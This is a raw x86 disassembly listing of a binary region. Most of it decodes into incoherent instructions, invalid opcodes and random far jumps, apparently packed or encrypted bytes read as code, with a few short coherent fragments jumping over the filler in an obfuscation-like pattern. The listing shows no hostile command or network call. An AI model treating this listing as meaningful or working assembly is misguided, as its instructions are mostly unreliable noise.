  405e23:	fidiv  WORD PTR [ebp+0x3a]
  405e26:	xor    DWORD PTR [eax+0x12],edi
  405e29:	or     eax,DWORD PTR [edi-0x17]
  405e2c:	frstor [esi]
  405e2e:	push   ebx
  405e2f:	adc    esi,eax
  405e31:	jle    0x405e7d
  405e33:	aas    
  405e34:	sbb    dl,BYTE PTR [edi-0xb1450dc]
  405e3a:	fisttp WORD PTR [ecx]
  405e3c:	stos   DWORD PTR es:[edi],eax
  405e3d:	xor    esp,DWORD PTR [ebx+eax*4+0x56]
  405e41:	int3   
  405e42:	dec    ebp
  405e43:	loop   0x405e98
  405e45:	js     0x405dc7
  405e47:	pop    ss
  405e48:	or     al,0x68
  405e4a:	cs push es
  405e4c:	sbb    DWORD PTR [eax],esi
  405e4e:	push   esp
  405e4f:	jne    0x405e41
  405e51:	sahf   
  405e52:	push   esp
  405e53:	push   ds
  405e54:	retf   
  405e55:	inc    edx
  405e56:	in     eax,0x72
  405e58:	pop    edx
  405e59:	jne    0x405ec5
  405e5b:	mov    fs,ecx
  405e5d:	loop   0x405e23
  405e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e60:	ret    0xdb89
  405e63:	adc    al,0xe6
  405e65:	push   0x2a21a6c1
  405e6a:	les    esi,FWORD PTR [eax+0x7a70caed]
  405e70:	and    al,0x85
  405e72:	xor    BYTE PTR [edi],dl
  405e74:	js     0x405e49
  405e76:	jecxz  0x405e90
  405e78:	push   0xffffffb0
  405e7a:	fnsave [edi+esi*2+0x46117c6b]
  405e81:	push   ecx
  405e82:	cmovb  esp,DWORD PTR [esi-0x5f]
  405e86:	mov    ch,0x58
  405e88:	lods   al,BYTE PTR ds:[esi]
  405e89:	nop
  405e8a:	jns    0x405e65
  405e8c:	shl    DWORD PTR [ecx+0x1b58eb36],cl
  405e92:	clc    
  405e93:	scas   al,BYTE PTR es:[edi]
  405e94:	sbb    bh,bl
  405e96:	jg     0x405e2c
  405e98:	mov    ebp,0xba54ae42
  405e9d:	pushf  
  405e9e:	xchg   edx,eax
  405e9f:	in     al,0x17
  405ea1:	pop    ebp
  405ea2:	pop    ss
  405ea3:	ins    BYTE PTR es:[edi],dx
  405ea4:	mov    bl,0xc1
  405ea6:	push   edi
  405ea7:	shl    DWORD PTR [esi],cl
  405ea9:	dec    ebx
  405eaa:	xchg   edx,eax
  405eab:	push   ebp
  405eac:	arpl   WORD PTR [ebp-0x3],bx
  405eaf:	pop    es
  405eb0:	xchg   BYTE PTR [eax],cl
  405eb2:	sub    al,0x7e
  405eb4:	dec    ebx
  405eb5:	ds push esp
  405eb7:	sub    eax,0xbdc9588c
  405ebc:	in     eax,0x60
  405ebe:	jno    0x405e94
  405ec0:	mov    DWORD PTR [ebx+eax*8],ecx
  405ec3:	cli    
  405ec4:	mov    dh,0x79
  405ec6:	call   0x7c696a97
  405ecb:	cmp    al,0xaf
  405ecd:	das    
  405ece:	or     DWORD PTR [ecx+0x5aff490c],edx
  405ed4:	ret    
  405ed5:	push   esi
  405ed6:	sti    
  405ed7:	scas   al,BYTE PTR es:[edi]
  405ed8:	mov    ch,0x7a
  405eda:	out    0xea,al
  405edc:	xchg   DWORD PTR [edi+0x3605527e],ebp
  405ee2:	bound  edi,QWORD PTR [esi+ecx*4+0xd]
  405ee6:	fnsave [eax]
  405ee8:	ins    BYTE PTR es:[edi],dx
  405ee9:	inc    esi
  405eea:	add    DWORD PTR ds:0xe15142f9,0xfffffff3
  405ef1:	mov    edx,0x40b92778
  405ef6:	mov    ecx,DWORD PTR [ebp+0xc9681e2]
  405efc:	pop    esp
  405efd:	(bad)  
  405efe:	mov    bh,0x2f
  405f00:	mov    ds:0x9805f100,al
  405f05:	or     ch,ch
  405f07:	pcmpgtd mm3,QWORD PTR [edx+0x38]
  405f0b:	lahf   
  405f0c:	sub    ch,ah
  405f0e:	add    bh,0x0
  405f11:	sub    edx,DWORD PTR ds:0xc0ba3193
  405f17:	add    DWORD PTR [edx+0x35],ebx
  405f1a:	lock loop 0x405eef
  405f1d:	in     al,0x39
  405f1f:	lods   eax,DWORD PTR ds:[esi]
  405f20:	add    DWORD PTR [eax-0x40],eax
  405f23:	or     al,0x8a
  405f25:	faddp  st(0),st
  405f27:	mov    bl,0x8f
  405f29:	add    DWORD PTR [esi],esp
  405f2b:	xchg   DWORD PTR [ebp-0x1608163],ecx
  405f31:	mov    ds:0x8a172ebb,al
  405f36:	inc    esi
  405f37:	fimul  WORD PTR [ecx+0x2a]
  405f3a:	jnp    0x405f7c
  405f3c:	pop    ebx
  405f3d:	sbb    ecx,DWORD PTR [ecx-0xb]
  405f40:	mov    edi,0x35044b1d
  405f45:	ja     0x405f04
  405f47:	outs   dx,BYTE PTR ds:[esi]
  405f48:	adc    ebp,ebp
  405f4a:	or     BYTE PTR [edx-0x42],dl
  405f4d:	pop    ebx
  405f4e:	retf   0x72af
  405f51:	test   DWORD PTR [eax-0x67],esi
  405f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f55:	lea    esi,[edi]
  405f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f58:	mov    bh,0xb3
  405f5a:	xchg   ebx,eax
  405f5b:	test   BYTE PTR [edi-0x6f],0x5f
  405f5f:	xchg   edi,eax
  405f60:	jnp    0x405f54
  405f62:	jmp    0xee50509e
  405f67:	ds cwde 
  405f69:	rol    DWORD PTR [edx-0x7],1
  405f6c:	cmp    BYTE PTR [edx-0x6e],cl
  405f6f:	jnp    0x405f44
  405f71:	(bad)  
  405f72:	pop    ss
  405f73:	inc    esi
  405f74:	jne    0x405f14
  405f76:	ficom  DWORD PTR [ebx+0x4f19ee4b]
  405f7c:	bound  edi,QWORD PTR [edx]
  405f7e:	or     esp,DWORD PTR [esi]
  405f80:	popa   
  405f81:	lods   eax,DWORD PTR ds:[esi]
  405f82:	cmp    esp,ecx
  405f84:	xchg   ebp,eax
  405f85:	pop    edx
  405f86:	add    DWORD PTR [edx],0xd4009a48
  405f8c:	(bad)  
  405f8d:	or     eax,0xf5738926
  405f92:	hlt    
  405f93:	xchg   ebx,eax
  405f94:	imul   esi,DWORD PTR [ecx-0x11],0x411890e6
  405f9b:	sub    al,0xab
  405f9d:	js     0x405fea
  405f9f:	addr16 xor al,0xc6
  405fa2:	jl     0x405ffa
  405fa4:	xchg   BYTE PTR [edi+ecx*4-0x3c],bh
  405fa8:	ja     0x406010
  405faa:	pushf  
  405fab:	xchg   edi,eax
  405fac:	sbb    eax,0xfa8fca62
  405fb1:	push   0xda2ac184
  405fb6:	mov    eax,0x9e67e047
  405fbb:	add    ebx,DWORD PTR [esi+0x937864e]
  405fc1:	adc    al,0x19
  405fc3:	int3   
  405fc4:	jbe    0x405fe8
  405fc6:	pop    es
  405fc7:	rol    BYTE PTR [edi+esi*8-0x69],1
  405fcb:	add    al,0xc3
  405fcd:	retfw  0x6b22
  405fd1:	jge    0x406025
  405fd3:	outs   dx,BYTE PTR ds:[esi]
  405fd4:	adc    DWORD PTR [ebp-0x34],0x60be18fa
  405fdb:	ins    BYTE PTR es:[edi],dx
  405fdc:	mov    cs:0xa823df19,al
  405fe2:	jno    0x405fbe
  405fe4:	jb     0x406043
  405fe6:	push   esi
  405fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fe8:	push   0x27
  405fea:	jae    0x406027
  405fec:	ja     0x406025
  405fee:	dec    edi
  405fef:	mov    ah,0x9
  405ff1:	mov    ecx,0x29b7580f
  405ff6:	(bad)  
  405ff7:	cs inc ebx
  405ff9:	sbb    BYTE PTR [ebx+0x3c137e8e],bl
  405fff:	push   ebx
  406000:	mov    esi,0xe34801d2
  406005:	(bad)  
  406006:	cmc    
  406007:	cmp    edx,DWORD PTR ds:0x685845db
  40600d:	(bad)  
  40600e:	adc    bh,BYTE PTR [eax-0x49374c02]
  406014:	cmp    al,0x4b
  406016:	aad    0xcc
  406018:	mov    eax,0xe2f9dd0c
  40601d:	fidiv  DWORD PTR [esi+0x13]
  406020:	mov    WORD PTR [ebx-0xd],?
  406023:	nop
  406024:	jg     0x405fe2
  406026:	dec    esp
  406027:	into   
  406028:	call   FWORD PTR [edi+0xa2ce7e9]
  40602e:	retf   0x4c4d
  406031:	jg     0x40602e
  406033:	ficom  DWORD PTR [eax]
  406035:	fistp  QWORD PTR [ebp+0x6f]
  406038:	in     al,0x2d
  40603a:	cmp    esi,esi
  40603c:	adc    bl,BYTE PTR [ebp+0x41]
  40603f:	or     al,ch
  406041:	data16 adc dh,BYTE PTR [edi+ebp*4+0x7e7471ca]
  406049:	mov    al,ds:0xc852bd29
  40604e:	arpl   WORD PTR [ebp+0x608d09f9],bx
  406054:	jg     0x4060a1
  406056:	jae    0x40600f
  406058:	sub    DWORD PTR [eax],eax
  40605a:	mov    cl,0x81
  40605c:	mov    ah,0x83
  40605e:	aas    
  40605f:	jne    0x40600f
  406061:	(bad)  
  406062:	aad    0x95
  406064:	dec    edx
  406065:	xor    al,0xd3
  406067:	arpl   WORD PTR [ebp+ebx*4-0xd032797],bp
  40606e:	push   edi
  40606f:	cmp    DWORD PTR [eax],0x56
  406072:	popa   
  406073:	lea    esp,[edi+0x7f28ae97]
  406079:	fcomp  DWORD PTR [ecx]
  40607b:	int    0xd9
  40607d:	ss xchg ecx,eax
  40607f:	mov    esp,0xa5c2dd2c
  406084:	sub    BYTE PTR [esi+0x61d26f75],ah
  40608a:	cmc    
  40608b:	xor    eax,0xb5be1194
  406090:	jp     0x406111
  406092:	xor    bl,al
  406094:	in     eax,0xf3
  406096:	adc    esp,DWORD PTR [esi+eiz*1+0x6658a268]
  40609d:	push   esi
  40609e:	jb     0x406101
  4060a0:	pop    es
  4060a1:	dec    ecx
  4060a2:	in     al,dx
  4060a3:	or     BYTE PTR [edi+0x35],al
  4060a6:	js     0x406058
  4060a8:	sti    
  4060a9:	xchg   edi,eax
  4060aa:	lock out dx,al
  4060ac:	icebp  
  4060ad:	push   ds
  4060ae:	enter  0x8498,0x69
  4060b2:	pop    edi
  4060b3:	and    eax,edi
  4060b5:	sti    
  4060b6:	call   0xdc87:0x15e074d3
  4060bd:	cmp    al,0x53
  4060bf:	adc    dh,BYTE PTR [esi-0x2af99118]
  4060c5:	adc    eax,0xe0db4628
  4060ca:	or     al,0xcb
  4060cc:	rol    BYTE PTR [ebx-0xa],1
  4060cf:	sub    al,BYTE PTR cs:[ebp-0x38]
  4060d3:	jnp    0x406150
  4060d5:	sub    BYTE PTR [edi+0x39c49ec0],dl
  4060db:	adc    ebx,DWORD PTR [edx]
  4060dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060de:	cmp    esp,esp
  4060e0:	sbb    ecx,DWORD PTR ds:0xb797bba1
  4060e6:	in     al,0xc6
  4060e8:	lds    esi,FWORD PTR [ecx]
  4060ea:	out    0x74,al
  4060ec:	dec    edi
  4060ed:	add    dl,BYTE PTR [ecx+0x17]
  4060f0:	mov    ebp,0xe46668d5
  4060f5:	pop    edi
  4060f6:	dec    BYTE PTR [ebp-0x7603fabc]
  4060fc:	inc    ebp
  4060fd:	int3   
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	popf   
  40612d:	and    dl,bl
  40612f:	mov    esp,0x1818a378
  406134:	sahf   
  406135:	adc    bl,BYTE PTR [eax]
  406137:	sbb    BYTE PTR [ecx+0x35],dh
  40613a:	pop    es
  40613b:	loope  0x406102
  40613d:	or     DWORD PTR [ebx-0x3f],ecx
  406140:	sti    
  406141:	dec    esp
  406142:	(bad)  
  406143:	xchg   ecx,eax
  406144:	push   ebx
  406145:	lods   al,BYTE PTR ds:[esi]
  406146:	mov    ecx,0xbbf3304a
  40614b:	mov    esi,0xa2232b53
  406150:	les    esi,FWORD PTR [esi]
  406152:	and    eax,0x550df85e
  406157:	mov    al,0x28
  406159:	adc    ecx,DWORD PTR [edi+eax*4+0x77]
  40615d:	push   eax
  40615e:	push   ebp
  40615f:	popf   
  406160:	jae    0x4061af
  406162:	sbb    eax,0x2732d157
  406167:	ds int 0x37
  40616a:	stos   DWORD PTR es:[edi],eax
  40616b:	fidivr WORD PTR [ecx]
  40616d:	sub    eax,esp
  40616f:	lods   al,BYTE PTR ds:[esi]
  406170:	ins    BYTE PTR es:[edi],dx
  406171:	xor    eax,0x2ce2f609
  406176:	jp     0x4061c2
  406178:	sub    cl,BYTE PTR [ebp-0xc31551c]
  40617e:	mov    ch,0x52
  406180:	mov    al,0x95
  406182:	xor    eax,0x8d22a4e5
  406187:	in     eax,dx
  406188:	or     edi,edx
  40618a:	sbb    al,0x50
  40618c:	retf   0x46c1
  40618f:	(bad)  
  406191:	jp     0x4061ba
  406193:	adc    esi,DWORD PTR [ecx]
  406195:	dec    ebp
  406196:	mov    edx,0xdb68c809
  40619b:	adc    esi,DWORD PTR [edx+0x73497b7e]
  4061a1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a3:	ja     0x406164
  4061a5:	mov    ebx,DWORD PTR [ecx+0xf55c680]
  4061ab:	(bad)  
  4061ad:	cld    
  4061ae:	jle    0x406190
  4061b0:	mov    esi,0x1ee5e71d
  4061b5:	mov    ds:0x14888e67,al
  4061ba:	dec    ecx
  4061bb:	shl    BYTE PTR [ebx+ebx*1+0x7ccb004e],0xe7
  4061c3:	or     al,0xf8
  4061c5:	shr    DWORD PTR [edi],0xef
  4061c8:	pop    ecx
  4061c9:	das    
  4061ca:	xor    edi,DWORD PTR [esi+0x4d]
  4061cd:	and    edx,DWORD PTR [eax+0x32]
  4061d0:	ja     0x4061b3
  4061d2:	sti    
  4061d3:	cld    
  4061d4:	(bad)  
  4061d6:	pusha  
  4061d7:	out    dx,al
  4061d8:	sub    ebp,DWORD PTR [ebx-0x7d295a18]
  4061de:	push   ds
  4061df:	mov    ecx,0x6f556b6f
  4061e4:	fisub  WORD PTR [eax-0x4add8f02]
  4061ea:	adc    eax,DWORD PTR [ebx-0x28fb8799]
  4061f0:	mov    ebx,0x92b93173
  4061f5:	adc    dl,dh
  4061f7:	or     DWORD PTR [ecx+0x323138a],edi
  4061fd:	pop    eax
  4061fe:	adc    eax,DWORD PTR [esi]
  406200:	adc    ecx,DWORD PTR [esi+0x586bf7e2]
  406206:	add    edx,esp
  406208:	adc    DWORD PTR [ecx+0x45],0x3a
  40620c:	pop    eax
  40620d:	dec    ebx
  40620e:	xchg   edx,eax
  40620f:	test   al,0xf3
  406211:	ret    0x6be3
  406214:	push   0x8de7e329
  406219:	fsubr  QWORD PTR [edi+edi*4-0x3d7c4b6b]
  406220:	adc    ah,BYTE PTR [esi+eiz*4+0xbe4a6cb]
  406227:	dec    ebx
  406228:	sbb    eax,0xb439902e
  40622d:	and    BYTE PTR [esi],cl
  40622f:	sub    DWORD PTR [edx+0x7a],0x9b4c4483
  406236:	inc    ebx
  406237:	dec    eax
  406238:	scas   al,BYTE PTR es:[edi]
  406239:	pop    esp
  40623a:	repnz mov ah,0xc6
  40623d:	daa    
  40623e:	icebp  
  40623f:	sbb    BYTE PTR [eax+0x5db812f1],bl
  406245:	jge    0x40622c
  406247:	fldcw  WORD PTR [ebx+esi*2-0x34]
  40624b:	mov    al,0x3b
  40624d:	aad    0xf4
  40624f:	lock sbb ecx,DWORD PTR [ecx+edx*1-0x1e]
  406254:	xor    ch,BYTE PTR [edx+0x3e1e3bc5]
  40625a:	mov    esp,0x323557d7
  40625f:	ret    
  406260:	dec    ebp
  406261:	xchg   esp,eax
  406262:	jecxz  0x4061f6
  406264:	das    
  406265:	stos   BYTE PTR es:[edi],al
  406266:	adc    ebx,eax
  406268:	sbb    DWORD PTR [ecx+0x40],esp
  40626b:	pop    es
  40626c:	sub    DWORD PTR [edi],eax
  40626e:	ror    DWORD PTR [ecx],1
  406270:	jae    0x406225
  406272:	sbb    DWORD PTR [ebx],ebp
  406274:	gs dec edx
  406276:	(bad)  
  406277:	cs js  0x4062ac
  40627a:	adc    eax,0xae244e68
  40627f:	and    al,0x76
  406281:	pusha  
  406282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406283:	mov    al,0x4c
  406285:	imul   edi,ecx,0xfffffff2
  406288:	retf   
  406289:	cmp    edi,DWORD PTR [ebp-0x10]
  40628c:	dec    esi
  40628d:	adc    DWORD PTR [ecx+ecx*1],ebp
  406290:	mov    eax,ds:0x413b8801
  406295:	mov    dh,0x9d
  406297:	aam    0x78
  406299:	mov    edi,0x384cb548
  40629e:	jno    0x4062bc
  4062a0:	aad    0xc
  4062a2:	and    BYTE PTR [eax+ecx*4-0x1929facf],al
  4062a9:	rol    edi,0xc3
  4062ac:	(bad)  
  4062ad:	and    eax,0xf582f478
  4062b2:	sub    al,0x6e
  4062b4:	jmp    0x24ae313b
  4062b9:	and    esi,esp
  4062bb:	addr16 add eax,0x3bf556a7
  4062c1:	cmp    ch,BYTE PTR [esi+eax*2]
  4062c4:	lahf   
  4062c5:	mov    edi,0xd41687fd
  4062ca:	adc    cl,bh
  4062cc:	mov    ds:0x2ebc0276,al
  4062d1:	xchg   DWORD PTR [edi-0x5d7684af],eax
  4062d7:	inc    edi
  4062d8:	mov    ch,0x69
  4062da:	(bad)  
  4062db:	(bad)  
  4062dc:	lods   eax,DWORD PTR ds:[esi]
  4062dd:	aaa    
  4062de:	mov    DWORD PTR [edi+0x30],esp
  4062e1:	fild   WORD PTR [eax]
  4062e3:	push   esp
  4062e4:	imul   esp,DWORD PTR [ebx],0xffffffb1
  4062e7:	and    ebp,edi
  4062e9:	dec    edi
  4062ea:	cmp    DWORD PTR [edi-0x1b5fde9f],0x75
  4062f1:	mov    cl,0x85
  4062f3:	add    DWORD PTR [edx-0x60],esp
  4062f6:	hlt    
  4062f7:	shl    BYTE PTR [eax-0x16],1
  4062fa:	icebp  
  4062fb:	mov    edi,0x93d8874f
  406300:	je     0x4062ac
  406302:	inc    bh
  406304:	ds or  eax,0x5b7a5f4d
  40630a:	out    0xd1,al
  40630c:	mov    al,BYTE PTR [ecx+0x4eb84630]
  406312:	ror    BYTE PTR [ebx+0x2530a773],1
  406318:	pop    ebx
  406319:	sub    ch,BYTE PTR [eax-0x97312d]
  40631f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406320:	add    esp,DWORD PTR [eax]
  406322:	aad    0x2f
  406324:	scas   eax,DWORD PTR es:[edi]
  406325:	outs   dx,BYTE PTR ds:[esi]
  406326:	imul   edx,DWORD PTR [ebx-0x2b],0x8030e632
  40632d:	xchg   edi,eax
  40632e:	fadd   st(1),st
  406330:	pop    ss
  406331:	adc    bh,bh
  406333:	aam    0xca
  406335:	(bad)  
  406336:	pop    ebp
  406337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406338:	test   DWORD PTR [edx+0x4a],esp
  40633b:	pop    ecx
  40633c:	push   0x6c
  40633e:	jecxz  0x40637c
  406340:	mov    bh,0x93
  406342:	outs   dx,BYTE PTR ds:[esi]
  406343:	xchg   ebx,eax
  406344:	sub    bh,BYTE PTR [ecx]
  406346:	aas    
  406347:	jl     0x4062cc
  406349:	sub    BYTE PTR [ebx],bl
  40634b:	pushf  
  40634c:	sbb    DWORD PTR [eax+eiz*2+0x2232105f],0x5f4e1635
  406357:	push   ebp
  406358:	fcom   DWORD PTR [eax+esi*8+0x63ded9a1]
  40635f:	adc    BYTE PTR ds:0x845762a7,bl
  406365:	pop    ss
  406366:	clc    
  406367:	push   esi
  406368:	lods   al,BYTE PTR ds:[esi]
  406369:	jno    0x40633a
  40636b:	mov    ch,0x3e
  40636d:	imul   BYTE PTR [ecx+eiz*2-0x2e]
  406371:	mov    DWORD PTR [eax+0x39],0x2494a728
  406378:	enter  0xf5c3,0xab
  40637c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637d:	outs   dx,BYTE PTR ds:[esi]
  40637e:	cs out 0xb,al
  406381:	pop    ecx
  406382:	mov    ecx,0xac3131c8
  406387:	adc    DWORD PTR [ebx],esi
  406389:	jns    0x40631a
  40638b:	xor    BYTE PTR [ecx-0x6d09fdd],dl
  406391:	daa    
  406392:	(bad)  
  406393:	adc    edx,edi
  406395:	test   eax,ebx
  406397:	mov    ebx,0xec277475
  40639c:	mov    ecx,0x45f345cc
  4063a1:	sbb    esp,0x10273e22
  4063a7:	lock test al,0x5c
  4063aa:	mov    eax,0xab34862b
  4063af:	adc    al,BYTE PTR [esi-0x79]
  4063b2:	cs aaa 
  4063b4:	cmp    edx,DWORD PTR [ebp+eax*8+0x4b]
  4063b8:	fidiv  WORD PTR [eax+0x7b]
  4063bb:	pop    esi
  4063bc:	mov    ecx,0x86347f7e
  4063c1:	cs xchg ebx,eax
  4063c3:	mov    al,BYTE PTR [edi+ecx*8+0x53d5a10e]
  4063ca:	ficomp DWORD PTR [edx]
  4063cc:	push   ebp
  4063cd:	ror    cl,cl
  4063cf:	jecxz  0x406449
  4063d1:	or     al,0x3b
  4063d3:	inc    ebx
  4063d4:	sahf   
  4063d5:	xor    eax,0x3218c41e
  4063da:	in     eax,dx
  4063db:	ret    
  4063dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063dd:	sbb    cl,BYTE PTR [esi]
  4063df:	push   cs
  4063e0:	dec    edx
  4063e1:	mov    ah,0xee
  4063e3:	imul   ebx,DWORD PTR [edi-0x123845d9],0x2f0a9446
  4063ed:	rcl    cl,0x5a
  4063f0:	push   eax
  4063f1:	inc    edi
  4063f2:	pusha  
  4063f3:	ret    
  4063f4:	mov    WORD PTR [edx],?
  4063f6:	fnsave [edx+0x3e]
  4063f9:	cmp    BYTE PTR [ebx-0x42ae835c],cl
  4063ff:	fld    TBYTE PTR [ecx]
  406401:	ds and al,0xdd
  406404:	out    dx,al
  406405:	hlt    
  406406:	lds    esi,FWORD PTR [edi+0x1e944260]
  40640c:	push   ds
  40640d:	mov    edx,0x75f85dd8
  406412:	and    dh,bl
  406414:	ror    DWORD PTR [ecx+0x4765f42d],cl
  40641a:	jb     0x406428
  40641c:	loopne 0x406464
  40641e:	or     BYTE PTR [edx+0x6eef457],ah
  406424:	out    0x76,eax
  406426:	push   es
  406427:	arpl   sp,cx
  406429:	test   bl,al
  40642b:	repnz aas 
  40642d:	mov    esp,0xce0d7be9
  406432:	cdq    
  406433:	aas    
  406434:	sbb    eax,esp
  406436:	pop    es
  406437:	mov    dh,0xfe
  406439:	dec    esi
  40643a:	jns    0x406449
  40643c:	clc    
  40643d:	mov    dh,0xec
  40643f:	or     DWORD PTR [edx+0x5c4835bf],0xfffffff4
  406446:	pop    es
  406447:	dec    esp
  406448:	adc    eax,0x7138c26a
  40644d:	or     BYTE PTR [ecx+0x31b2563],0xc7
  406454:	call   0x36a5:0x93c548b7
  40645b:	dec    eax
  40645c:	jnp    0x40645e
  40645e:	cmp    edi,edx
  406460:	pop    esp
  406461:	jb     0x40643b
  406463:	add    dl,bl
  406465:	xchg   esi,eax
  406466:	int    0x7b
  406468:	gs jno 0x406449
  40646b:	mov    al,0xb6
  40646d:	sti    
  40646e:	ins    BYTE PTR es:[edi],dx
  40646f:	sub    edx,ebx
  406471:	jmp    0x406407
  406473:	xor    dh,BYTE PTR [edx+esi*8]
  406476:	mov    eax,ds:0x3decf891
  40647b:	push   esi
  40647c:	fcomp  QWORD PTR [esi+0x36af22f3]
  406482:	mov    ebx,0x75a291b9
  406487:	sbb    DWORD PTR [ebp-0x7aa10654],ebp
  40648d:	dec    edi
  40648e:	add    DWORD PTR [esi],edx
  406490:	dec    ebx
  406491:	fld    DWORD PTR [ecx-0xcd36c6d]
  406497:	test   BYTE PTR [ebp-0x37ca49b1],0x63
  40649e:	jbe    0x40647d
  4064a0:	dec    ebp
  4064a1:	cmc    
  4064a2:	mov    ebx,0x67e85c42
  4064a7:	nop
  4064a8:	mov    ds:0xec667659,eax
  4064ad:	test   eax,0x506a1e91
  4064b2:	add    bh,bl
  4064b4:	imul   ebx
  4064b6:	xor    DWORD PTR [ebx],ecx
  4064b8:	mov    bl,BYTE PTR [edi-0x2e]
  4064bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064bc:	inc    ebx
  4064bd:	les    ebx,FWORD PTR [eax]
  4064bf:	inc    ebp
  4064c0:	push   ds
  4064c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c2:	xchg   ebx,eax
  4064c3:	imul   esp,DWORD PTR [edi],0xc37303b0
  4064c9:	cld    
  4064ca:	sahf   
  4064cb:	loopne 0x40646e
  4064cd:	sub    eax,0x56008a5f
  4064d2:	inc    ebx
  4064d3:	mov    DWORD PTR [ebp-0x59],edi
  4064d6:	xchg   esi,eax
  4064d7:	jmp    0x860392c7
  4064dc:	pop    ecx
  4064dd:	inc    esi
  4064de:	adc    DWORD PTR [esp+ecx*2-0x28],esp
  4064e2:	cmp    al,0x13
  4064e4:	cmp    ch,0xbc
  4064e7:	mov    dl,0xdd
  4064e9:	dec    esi
  4064ea:	jmp    0x40647f
  4064ec:	cld    
  4064ed:	cdq    
  4064ee:	or     dh,bl
  4064f0:	add    dh,BYTE PTR [ecx+0x61]
  4064f3:	cdq    
  4064f4:	sub    DWORD PTR [edx],ecx
  4064f6:	in     al,0x56
  4064f8:	add    DWORD PTR [ebx],ecx
  4064fa:	ret    0xc8a
  4064fd:	or     BYTE PTR [ebx+0x830cc45],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi+0x7c793d76],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	inc    esi
  406557:	iret   
  406558:	mov    ebx,esi
  40655a:	scas   eax,DWORD PTR es:[edi]
  40655b:	pusha  
  40655c:	adc    al,0x75
  40655e:	cli    
  40655f:	jl     0x406544
  406561:	add    BYTE PTR [eax+0x32],al
  406564:	(bad)  
  406565:	stos   BYTE PTR es:[edi],al
  406566:	push   esi
  406567:	lock adc ch,ah
  40656a:	sar    ch,cl
  40656c:	addr16 dec bx
  40656f:	iret   
  406570:	sbb    ebp,DWORD PTR [edi+0x7c03d93c]
  406576:	lahf   
  406577:	mov    al,0xb8
  406579:	xor    esi,DWORD PTR ds:0xf6d5cf62
  40657f:	pushf  
  406580:	cmc    
  406581:	dec    ebx
  406582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406583:	xor    eax,0x86ea926d
  406588:	outs   dx,DWORD PTR ds:[esi]
  406589:	and    BYTE PTR [ebp+0x3d01ace5],ch
  40658f:	pop    edi
  406590:	lds    edx,FWORD PTR [eax-0x72018c2b]
  406596:	sub    BYTE PTR [ebp+0xf64b49c],0x9
  40659d:	push   esp
  40659e:	pop    ebp
  40659f:	sbb    bl,BYTE PTR [ecx+0x68]
  4065a2:	mov    esp,0xdaa425c
  4065a7:	xlat   BYTE PTR ds:[ebx]
  4065a8:	mov    bh,0x4f
  4065aa:	jecxz  0x4065b9
  4065ac:	out    0x4d,eax
  4065ae:	leave  
  4065af:	in     eax,dx
  4065b0:	or     dh,BYTE PTR [edx]
  4065b2:	ins    BYTE PTR es:[edi],dx
  4065b3:	loopne 0x406634
  4065b5:	out    0xa6,eax
  4065b7:	jb     0x406596
  4065b9:	shl    ch,1
  4065bb:	cs dec ebx
  4065bd:	cmp    eax,0x6c219a86
  4065c2:	stos   BYTE PTR es:[edi],al
  4065c3:	jno    0x4065da
  4065c5:	xchg   BYTE PTR [ebx-0x14d90196],ch
  4065cb:	or     DWORD PTR [eax+0x36],edx
  4065ce:	mov    edx,0xb9592c99
  4065d3:	xchg   edi,eax
  4065d4:	lds    edx,FWORD PTR [eax+0x38]
  4065d7:	xchg   esi,eax
  4065d8:	inc    edx
  4065d9:	jl     0x40657d
  4065db:	and    BYTE PTR [ebx+0x7eae30a9],ch
  4065e1:	fwait
  4065e2:	fs cmp al,0x6e
  4065e5:	pop    ebp
  4065e6:	popa   
  4065e7:	pushf  
  4065e8:	es xor al,0xb8
  4065eb:	ds fcom st(7)
  4065ee:	inc    ecx
  4065ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
